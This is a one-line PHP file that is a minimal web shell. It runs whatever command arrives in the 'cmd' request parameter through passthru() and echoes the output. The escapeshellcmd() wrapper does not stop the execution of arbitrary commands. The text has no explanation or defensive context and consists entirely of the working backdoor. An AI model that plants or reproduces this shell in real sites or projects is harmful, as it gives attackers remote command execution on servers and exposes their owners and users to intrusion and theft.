<?php echo passthru(escapeshellcmd($_REQUEST['cmd']));?>
